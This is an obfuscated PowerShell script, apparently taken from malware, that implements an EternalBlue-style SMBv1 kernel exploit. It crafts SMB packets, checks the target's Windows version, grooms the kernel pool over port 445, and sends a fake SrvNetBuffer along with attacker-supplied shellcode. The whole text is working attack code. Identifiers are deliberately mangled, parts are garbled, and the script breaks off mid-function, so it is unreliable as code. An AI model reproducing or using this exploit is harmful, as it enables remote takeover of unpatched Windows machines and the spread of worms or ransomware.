wB69jsb64=[convert]::ToBase64String([Text.UnicodeEncoding]::Ascii.GetBytes(NDck//This file is broken...  NDck+NDckir8rir8nNDck*2000+NDck NDck*200)+[convert]::FromBase64String(wB69jsb64))

function make_smb1_anonymous_login_packet {

[Byte[]] wB69pkt = [Byte[]] (0x00)

wB69pkt += 0x00,0x00,0x48

wB69pkt += 0xff,0x53,0x4D,0x42

wB69pkt += 0x73

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x18

wB69pkt += 0x01,0x48

wB69pkt += 0x00,0x00

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x00,0x00

wB69pkt += 0xff,0xff

wB69pkt += 0x2f,0x4b

wB69pkt += 0x00,0x00

wB69pkt += 0x00,0x00

wB69pkt += 0x0d

wB69pkt += 0xff

wB69pkt += 0x00

wB69pkt += 0x00,0x00

wB69pkt += 0x00,0xf0

wB69pkt += 0x02,0x00

wB69pkt += 0x2f,0x4b

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x00,0x00

wB69pkt += 0x00,0x00

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x41,0xc0,0x00,0x00

wB69pkt += 0x0b,0x00

wB69pkt += 0x00,0x00

wB69pkt += 0x6e,0x74,0x00

wB69pkt += 0x70,0x79,0x73,0x6d,0x62,0x00

return wB69pkt

}

function smb1_anonymous_login(wB69sock){

wB69raw_proto = Mir8Air8Kir8e_Smb1_ir8ANoNyir8mOusir8_LOir8gin_Pair8Cir8kET

wB69sock.Send(wB69raw_proto) uOva OUT-ir8NulL

return smb1_Getir8_ir8Resir8Poir8NsE(wB69sock)

}

function negotiate_proto_request(){

[Byte[]] wB69pkt = [Byte[]] (0x00)

wB69pkt += 0x00,0x00,0x2f

wB69pkt += 0xFF,0x53,0x4D,0x42

wB69pkt += 0x72

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x18

wB69pkt += 0x01,0x48

wB69pkt += 0x00,0x00

wB69pkt += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

wB69pkt += 0x00,0x00

wB69pkt += 0xff,0xff

wB69pkt += 0x2F,0x4B

wB69pkt += 0x00,0x00

wB69pkt += 0x00,0x00

wB69pkt += 0x00

wB69pkt += 0x0c,0x00

wB69pkt += 0x02

wB69pkt += 0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00

return wB69pkt

}

function smb_header(wB69smbheader) {

wB69parsed_header =@{server_component=wB69smbheader[0..3];

smb_command=wB69smbheader[4];

error_class=wB69smbheader[5];

reserved1=wB69smbheader[6];

error_code=wB69smbheader[6..7];

flags=wB69smbheader[8];

flags2=wB69smbheader[9..10];

process_id_high=wB69smbheader[11..12];

signature=wB69smbheader[13..21];

reserved2=wB69smbheader[22..23];

tree_id=wB69smbheader[24..25];

process_id=wB69smbheader[26..27];

user_id=wB69smbheader[28..29];

multiplex_id=wB69smbheader[30..31];

}

return wB69parsed_header

}

function smb1_get_response(wB69sock){

wB69tcp_response = [Array]::CreateInstance((utH9butH9'+'+utH9yteutH9), 1024)

try{

wB69sock.Receive(wB69tcp_response)uOva Oir8Uir8T-NULl

}

catch {

}

wB69netbios = wB69tcp_response[0..4]

wB69smb_header = wB69tcp_response[4..36]

wB69parsed_header = smB_hir8eir8ADeR(wB69smb_header)

return wB69tcp_response, wB69parsed_header

}

function client_negotiate(wB69sock){

wB69raw_proto = nir8egOtiaTir8e_Prir8otir8o_Rir8EQUEst

wB69sock.Send(wB69raw_proto) uOva OuTir8-nir8ULL

return sMir8B1_ir8geT_ir8REsponSe(wB69sock)

}

function tree_connect_andx(wB69sock, wB69target, wB69userid){

wB69raw_proto = trir8eE_cOir8Nnir8ECT_anir8dir8X_Rir8EQUEST wB69target wB69userid

wB69sock.Send(wB69raw_proto) uOva ouir8T-nULl

return sMir8B1ir8_get_ir8Respoir8Nse(wB69sock)

}

function tree_connect_andx_request(wB69target, wB69userid) {

[Byte[]] wB69pkt = [Byte[]](0x00)

wB69pkt +=0x00,0x00,0x48

wB69pkt +=0xFF,0x53,0x4D,0x42

wB69pkt +=0x75

wB69pkt +=0x00,0x00,0x00,0x00

wB69pkt +=0x18

wB69pkt +=0x01,0x48

wB69pkt +=0x00,0x00

wB69pkt +=0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

wB69pkt +=0x00,0x00

wB69pkt +=0xff,0xff

wB69pkt +=0x2F,0x4B

wB69pkt += wB69userid

wB69pkt +=0x00,0x00

wB69ipc = ((utH9SWutH9+utH90SW0utH9) -rePLACeutH9SW0utH9,[Char]92)+ wB69target + NDck9e0IPCwB69NDck

wB69pkt +=0x04

wB69pkt +=0xFF

wB69pkt +=0x00

wB69pkt +=0x00,0x00

wB69pkt +=0x00,0x00

wB69pkt +=0x01,0x00

wB69al=[system.Text.Encoding]::ASCII.GetBytes(wB69ipc).Count+8

wB69pkt+=[bitconverter]::GetBytes(wB69al)[0],0x00

wB69pkt +=0x00

wB69pkt += [system.Text.Encoding]::ASCII.GetBytes(wB69ipc)

wB69pkt += 0x00

wB69pkt += 0x3f,0x3f,0x3f,0x3f,0x3f,0x00

wB69len = wB69pkt.Length - 4

wB69hexlen = [bitconverter]::GetBytes(wB69len)[-2..-4]

wB69pkt[1] = wB69hexlen[0]

wB69pkt[2] = wB69hexlen[1]

wB69pkt[3] = wB69hexlen[2]

return wB69pkt

}

function smb1_anonymous_connect_ipc(wB69target){

wB69client = NEir8W-ir8objir8EcT System.Net.Sockets.TcpClient(wB69target,445)

wB69sock = wB69client.Client

Cir8liEntir8_nir8egOir8TiATe(wB69sock) uOva Oir8Ut-ir8NuLl

wB69raw, wB69smbheader = Smir8Bir81_Air8NONyMOir8US_LOgIN wB69sock

wB69raw, wB69smbheader = TrEe_cir8Oir8Nir8Nir8eCT_aNDX wB69sock wB69target wB69smbheader.user_id

return wB69smbheader, wB69sock

}

function make_smb1_nt_trans_packet(wB69tree_id, wB69user_id) {

[Byte[]] wB69pkt = [Byte[]] (0x00)

wB69pkt += 0x00,0x08,0x3C

wB69pkt += 0xff,0x53,0x4D,0x42

wB69pkt += 0xa0

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x18

wB69pkt += 0x01,0x48

wB69pkt += 0x00,0x00

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x00,0x00

wB69pkt += wB69tree_id

wB69pkt += 0x2f,0x4b

wB69pkt += wB69user_id

wB69pkt += 0x00,0x00

wB69pkt += 0x14

wB69pkt += 0x01

wB69pkt += 0x00,0x00

wB69pkt += 0x1e,0x00,0x00,0x00

wB69pkt += 0x16,0x00,0x01,0x00

wB69pkt += 0x1e,0x00,0x00,0x00

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x1e,0x00,0x00,0x00

wB69pkt += 0x4c,0x00,0x00,0x00

wB69pkt += 0xd0,0x07,0x00,0x00

wB69pkt += 0x6c,0x00,0x00,0x00

wB69pkt += 0x01

wB69pkt += 0x00,0x00

wB69pkt += 0x00,0x00

wB69pkt += 0xf1,0x07

wB69pkt += 0xff

wB69pkt += [Byte[]] (0x00) * 0x1e

wB69pkt += 0xff,0xff,0x00,0x00,0x01

wB69pkt += [Byte[]](0x00) * 0x7CD

return wB69pkt

}

function make_smb1_trans2_exploit_packet(wB69tree_id, wB69user_id, wB69data, wB69timeout) {

wB69timeout = (wB69timeout * 0x10) + 7

[Byte[]] wB69pkt = [Byte[]] (0x00)

wB69pkt += 0x00,0x10,0x38

wB69pkt += 0xff,0x53,0x4D,0x42

wB69pkt += 0x33

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x18

wB69pkt += 0x01,0x48

wB69pkt += 0x00,0x00

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x00,0x00

wB69pkt += wB69tree_id

wB69pkt += 0x2f,0x4b

wB69pkt += wB69user_id

wB69pkt += 0x00,0x00

wB69pkt += 0x09

wB69pkt += 0x00,0x00

wB69pkt += 0x00,0x10

wB69pkt += 0x00,0x00

wB69pkt += 0x00,0x00

wB69pkt += 0x00

wB69pkt += 0x00

wB69pkt += 0x00,0x10

wB69pkt += 0x38,0x00,0xd0

wB69pkt += [bitconverter]::GetBytes(wB69timeout)[0]

wB69pkt += 0x00,0x00

wB69pkt += 0x03,0x10

wB69pkt += 0xff,0xff,0xff

wB69pkt +=wB69data

wB69len = wB69pkt.Length - 4

wB69hexlen = [bitconverter]::GetBytes(wB69len)[-2..-4]

wB69pkt[1] = wB69hexlen[0]

wB69pkt[2] = wB69hexlen[1]

wB69pkt[3] = wB69hexlen[2]

return wB69pkt

}

function make_smb1_trans2_last_packet(wB69tree_id, wB69user_id, wB69data, wB69timeout) {

wB69timeout = (wB69timeout * 0x10) + 7

[Byte[]] wB69pkt = [Byte[]] (0x00)

wB69pkt += 0x00,0x08,0x7e

wB69pkt += 0xff,0x53,0x4D,0x42

wB69pkt += 0x33

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x18

wB69pkt += 0x01,0x48

wB69pkt += 0x00,0x00

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x00,0x00

wB69pkt += wB69tree_id

wB69pkt += 0x2f,0x4b

wB69pkt += wB69user_id

wB69pkt += 0x00,0x00

wB69pkt += 0x09

wB69pkt += 0x00,0x00

wB69pkt += 0x46,0x08

wB69pkt += 0x00,0x00

wB69pkt += 0x00,0x00

wB69pkt += 0x00

wB69pkt += 0x00

wB69pkt += 0x46,0x08

wB69pkt += 0x38,0x00,0xd0

wB69pkt += [bitconverter]::GetBytes(wB69timeout)[0]

wB69pkt += 0x00,0x00

wB69pkt += 0x49,0x08

wB69pkt += 0xff,0xff,0xff

wB69pkt +=wB69data

wB69len = wB69pkt.Length - 4

wB69hexlen = [bitconverter]::GetBytes(wB69len)[-2..-4]

wB69pkt[1] = wB69hexlen[0]

wB69pkt[2] = wB69hexlen[1]

wB69pkt[3] = wB69hexlen[2]

return wB69pkt

}

function send_big_trans2(wB69sock, wB69smbheader, wB69data, wB69firstDataFragmentSize, wB69sendLastChunk){

wB69nt_trans_pkt = mir8Air8kE_sMB1_ir8Nir8T_TRAnir8sir8_pAckEt wB69smbheader.tree_id wB69smbheader.user_id

wB69sock.Send(wB69nt_trans_pkt) uOva Oir8Ut-nULl

wB69raw, wB69transheader = sMb1_Gir8eT_ResPoir8Nir8sE(wB69sock)

wB69i=wB69firstDataFragmentSize

wB69timeout=0

while (wB69i -lt wB69data.count)

{

wB69sendSize=[System.Math]::Min(4096,(wB69data.count-wB69i))

if ((wB69data.count-wB69i) -le 4096){

if (!wB69sendLastChunk)

{ break }

}

wB69trans2_pkt = MAir8kir8E_SmB1_Trir8Air8Ns2_EXplir8oir8It_ir8PAcKET wB69smbheader.tree_id wB69smbheader.user_id wB69data[wB69i..(wB69i+wB69sendSize-1)] wB69timeout

wB69sock.Send(wB69trans2_pkt) uOva OuTir8-nUll

wB69timeout+=1

wB69i +=wB69sendSize

}

if (wB69sendLastChunk)

{Smbir81_ir8GeT_ReSPoir8NsE(wB69sock) }

return wB69i,wB69timeout

}

function createSessionAllocNonPaged(wB69target, wB69size) {

wB69client = nir8Ew-Oir8Bir8JECT System.Net.Sockets.TcpClient(wB69target,445)

wB69sock = wB69client.Client

CLir8iir8Eir8Nt_Nir8EgotiATE(wB69sock) uOva Oir8Uir8T-Null

wB69flags2=16385

if (wB69size -ge 0xffff)

{ wB69reqsize=wB69size /2}

else

{

wB69flags2 =49153

wB69reqsize= wB69size

}

if(wB69flags2 -eq 49153) {

wB69pkt = makEir8_SmBir81_ir8FRee_hOlE_SEsir8siir8onir8_Pir8ACKeT (0x01,0xc0) (0x02,0x00) (0xf0,0xff,0x00,0x00,0x00)

}

else {

wB69pkt = mir8AKE_smB1_fir8REir8e_hOir8lir8E_sESsiOir8N_Pir8Air8cKir8eT (0x01,0x40) (0x02,0x00) (0xf8,0x87,0x00,0x00,0x00)

}

wB69sock.Send(wB69pkt) uOva OUt-ir8Nuir8Ll

sMb1_ir8GEt_Rir8eSpir8ONSE(wB69sock) uOva oUtir8-Nir8ULl

return wB69sock

}

function make_smb1_free_hole_session_packet(wB69flags2, wB69vcnum, wB69native_os) {

[Byte[]] wB69pkt = 0x00

wB69pkt += 0x00,0x00,0x51

wB69pkt += 0xff,0x53,0x4D,0x42

wB69pkt += 0x73

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x18

wB69pkt += wB69flags2

wB69pkt += '+'0x00,0x00

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x00,0x00

wB69pkt += 0xff,0xff

wB69pkt += 0x2f,0x4b

wB69pkt += 0x00,0x00

wB69pkt += 0x40,0x00

wB69pkt += 0x0c

wB69pkt += 0xff

wB69pkt += 0x00

wB69pkt += 0x00,0x00

wB69pkt += 0x00,0xf0

wB69pkt += 0x02,0x00

wB69pkt += wB69vcnum

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x00,0x00

wB69pkt += 0x00,0x00,0x00,0x00

wB69pkt += 0x00,0x00,0x00,0x80

wB69pkt += 0x16,0x00

wB69pkt += wB69native_os

wB69pkt += [Byte[]] (0x00) * 17

return wB69pkt

}

function smb2_grooms(wB69target, wB69grooms, wB69payload_hdr_pkt, wB69groom_socks){

for(wB69i =0; wB69i -lt wB69grooms; wB69i++)

{

wB69client = neW-oir8Bir8jEct System.Net.Sockets.TcpClient(wB69target,445)

wB69gsock = wB69client.Client

wB69groom_socks += wB69gsock

wB69gsock.Send(wB69payload_hdr_pkt) uOva Oir8Ut-ir8NuLl

}

return wB69groom_socks

}

function make_smb2_payload_headers_packet(){

[Byte[]] wB69pkt = [Byte[]](0x00,0x00,0xff,0xf7,0xFE) + [system.Text.Encoding]::ASCII.GetBytes((utH9SutH9+utH9MButH9)) + [Byte[]](0x00)*124

return wB69pkt

}

function eb7(wB69target ,wB69shellcode) {

wB69NTFEA_SIZE = 0x11000

wB69ntfea10000=0x00,0x00,0xdd,0xff+[byte[]]0x41*0xffde

wB69ntfea11000 =(0x00,0x00,0x00,0x00,0x00)*600

wB69ntfea11000 +=0x00,0x00,0xbd,0xf3+[byte[]]0x41*0xf3be

wB69ntfea1f000=(0x00,0x00,0x00,0x00,0x00)*0x2494

wB69ntfea1f000=0x00,0x00,0xed,0x48+0x41*0x48ee

wB69ntfea=@{0x10000=wB69ntfea10000;0x11000=wB69ntfea11000}

wB69TARGET_HAL_HEAP_ADDR_x64 = 0xffffffffffd00010

wB69TARGET_HAL_HEAP_ADDR_x86 = 0xffdff000

[byte[]]wB69fakeSrvNetBufferNsa = @(0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0xf0,0xdf,0xff,0x00,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x80,0xef,0xdf,0xff,0x00,0x00,0x00,0x00,0x10,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0x10,0x01,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0xff,0xcf,0xff,0xff,0xff,0xff,0xff)

[byte[]]wB69fakeSrvNetBufferX64 = @(0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0x10,0x01,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0xff,0xcf,0xff,0xff,0xff,0xff,0xff)

wB69fakeSrvNetBuffer = wB69fakeSrvNetBufferNsa

[byte[]]wB69feaList=[byte[]](0x00,0x00,0x01,0x00)

wB69feaList += wB69ntfea[wB69NTFEA_SIZE]

wB69feaList +=0x00,0x00,0x8f,0x00+ wB69fakeSrvNetBuffer

wB69feaList +=0x12,0x34,0x78,0x56

[byte[]]wB69fake_recv_struct=@(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00'+',0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0xf0,0xdf,0xff,0xc0,0xf0,0xdf,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,'+'0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0xef,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xf0,0x01,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0x01,0xd0,0xff,0xff,0xff,0xff,0xff)

wB69client = nir8Ew-oBjir8EcT System.Net.Sockets.TcpClient(wB69target,445)

wB69sock = wB69client.Client

wB69sock.ReceiveTimeout =5000

clIeir8NT_Nir8Eir8GoTIir8Ate(wB69sock) uOva out-ir8NulL

wB69raw, wB69smbheader = smir8Bir81_ir8AnONYmOuir8Sir8_loGir8In wB69sock

wB69os=[system.Text.Encoding]::ascii.GetString(wB69raw[45..(wB69raw.count-1)]).ToLower()


if (!((wB69os.contains((utH9windowsutH9+utH9 utH9+utH97utH9))) -or (wB69os.contains((utH9wiutH9+utH9ndutH9+utH9owsutH9)) -and wB69os.contains((utH9200utH9+utH98utH9))) -or (wB69os.contains((utH9wutH9+utH9indoutH9+utH9wutH9+utH9s viutH9+utH9stautH9))) -or (wB69os.contains((utH9windutH9+utH9outH9+utH9wsutH9)) -and wB69os.contains((utH9201utH9+utH91utH9)))))

{return wB69False}

wB69raw, wB69smbheader = tir8Ree_coir8Nir8NECt_AnDx wB69sock wB69target wB69smbheader.user_id


wB69progress , wB69timeout= Seir8Nir8dir8_Bir8Ig_tRanS2 wB69sock wB69smbheader wB69feaList 2000 wB69False

wB69allocConn = CReAir8Tir8EsESir8SIONaLir8loCnonir8pagEd wB69target (wB69NTFEA_SIZE - 0x1010)

wB69payload_hdr_pkt = mAkEir8_smb2ir8_paYlOad_HEir8AdEir8RS_ir8Pair8cKEt

wB69groom_socks =@()

for (wB69i=0; wB69i -lt 13; wB69i++)

{

wB69client = nir8ew-Obir8jEir8ct System.Net.Sockets.TcpClient(wB69target,445)

wB69gsock = wB69client.Client

wB69groom_socks += wB69gsock

wB69gsock.Send(wB69payload_hdr_pkt) uOva oUtir8-nir8ULL

}

wB69holeConn = Crir8EAteseSsir8iir8oir8Nir8ALLocir8Nir8Onpir8AGEd wB69target (wB69NTFEA_SIZE - 0x10)

wB69allocConn.close()

for (wB69i=0; wB69i -lt 5; wB69i++)

{

wB69client = nir8Ew-oBjir8ecT System.Net.Sockets.TcpClient(wB69target,445)

wB69gsock = wB69client.Client

wB69groom_socks += wB69gsock

wB69gsock.Send(wB69payload_hdr_pkt) uOva OUT-NUir8lL

}

wB69holeConn.close()

wB69trans2_pkt = maKeir8_Smb1ir8_Tranir8S2_lasTir8_PAcir8KET wB69smbheader.tree_id wB69smbheader.user_id wB69feaList[wB69progress..wB69feaList.count] wB69timeout

wB69sock.Send(wB69trans2_pkt) uOva oir8UT-nir8ULl

wB69raw, wB69trans2header = sMBir81ir8_gET_respir8Oir8Nse(wB69sock)

foreach (wB69sk in wB69groom_socks)

{

wB69sk.Send(wB69fake_recv_struct + wB69shellcode) uOva Oir8UT-Nir8Ull

}

foreach (wB69sk in wB69groom_socks)

{

wB69sk.close() uOva oir8Ut-ir8NUlL

}

wB69sock.Close()uOva Ouir8T-NulL

return wB69True

}


function createFakeSrvNetBuffer8(wB69sc_size)

{

    wB69totalRecvSize = 0x80 + 0x180 + wB69sc_size

	wB69fakeSrvNetBufferX64 = [byte[]]0x00*16

	wB69fakeSrvNetBufferX64 += 0xf0,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff

	wB69fakeSrvNetBufferX64 += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe8,0x82,0x00,0x00,0x00,0x00,0x00,0x00

	wB69fakeSrvNetBufferX64 +=  [byte[]]0x00*16

    wB69a=[bitconverter]::GetBytes(wB69totalRecvSize)

	wB69fakeSrvNetBufferX64 += [byte[]]0x00*8+wB69a+[byte[]]0x00*4

	wB69fakeSrvNetBufferX64 += 0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff

	wB69fakeSrvNetBufferX64 += [byte[]]0x00*48

	wB69fakeSrvNetBufferX64 += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00

	wB69fakeSrvNetBufferX64 += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x3f,0xd0,0xff,0xff,0xff,0xff,0xff

	return wB69fakeSrvNetBufferX64

}


function createFeaList8(wB69sc_size, wB69ntfea){

	wB69feaList = 0x00,0x00,0x01,0x00

	wB69feaList += wB69ntfea

	wB69fakeSrvNetBuf = CreateFAKEsRvir8Nir8etir8BuFfeR8(wB69sc_size)

    wB69a=[bitconverter]::GetBytes(wB69fakeSrvNetBuf.Length-1)

	wB69feaList += 0x00,0x00,wB69a[0],wB69a[1] + wB69fakeSrvNetBuf 

	wB69feaList += 0x12,0x34,0x78,0x56

	return wB69feaList

}


function  make_smb1_login8_packet8 {

 '+'   [Byte[]] wB69pkt = [Byte[]] (0x00) 

    wB69pkt += 0x00,0x00,0x88 

    wB69pkt += 0xff,0x53,0x4D,0x42

    wB69pkt += 0x73

    wB69pkt += 0x00,0x00,0x00,0x00

    wB69pkt += 0x18 

    wB69pkt += 0x01,0x48 

    wB69pkt += 0x00,0x00

    wB69pkt += 0x00,0x00,0x00,0x00

    wB69pkt += 0x00,0x00,0x00,0x00

    wB69pkt += 0x00,0x00

    wB69pkt += 0xff,0xff

    wB69pkt += 0x2f,0x4b 

    wB69pkt += 0x00,0x00 

    wB69pkt += 0x00,0x00       

    wB69pkt += 0x0c               

    wB69pkt += 0xff           

    wB69pkt += 0x00               

    wB69pkt += 0x00,0x00      

    wB69pkt += 0x00,0xf0     

    wB69pkt += 0x02,0x00   

    wB69pkt += 0x01,0x00  

    wB69pkt += 0x00,0x00,0x00,0x00  

	wB69pkt += 0x42,0x00,0x00,0x00,0x00,0x00 

	wB69pkt += 0x44,0xc0,0x00,0x80	

	wB69pkt += 0x4d,0x00	

	wB69pkt += 0x60,0x40,0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02,0xa0,0x36,0x30,0x34,0xa0,0x0e,0x30,0x0c,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a,0xa2,0x22,0x04,0x20,0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x01,0x00,0x00,0x00,0x05,0x02,0x88,0xa0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

    wB69pkt += 0x55,0x6e,0x69,0x78,0x00       

    wB69pkt += 0x53,0x61,0x6d,0x62,0x61,0x00

    return wB69pkt

}

function  make_ntlm_auth_packet8(wB69user_id) {

    [Byte[]] wB69pkt = [Byte[]] (0x00)    

    wB'+'69pkt += 0x00,0x00,0x96          

    wB69pkt += 0xff,0x53,0x4D,0x42      

    wB69pkt += 0x73               

    wB69pkt += 0x00,0x00,0x00,0x00  

    wB69pkt += 0x18          

    wB69pkt += 0x01,0x48          

    wB69pkt += 0x00,0x00       

    wB69pkt += 0x00,0x00,0x00,0x00  

    wB69pkt += 0x00,0x00,0x00,0x00  

    wB69pkt += 0x00,0x00      

    wB69pkt += 0xff,0xff    

    wB69pkt += 0x2f,0x4b  

    wB69pkt += wB69user_id    

    wB69pkt += 0x00,0x00   

    wB69pkt += 0x0c     

    wB69pkt += 0xff      

    wB69pkt += 0x00            

    wB69pkt += 0x00,0x00         

    wB69pkt += 0x00,0xf0            

    wB69pkt += 0x02,0x00        

    wB69pkt += 0x01,0x00     

    wB69pkt += 0x00,0x00,0x00,0x00    

	wB69pkt += 0x50,0x00,0x00,0x00,0x00,0x00 

	wB69pkt += 0x44,0xc0,0x00,0x80		

	wB69pkt += 0x5b,0x00			

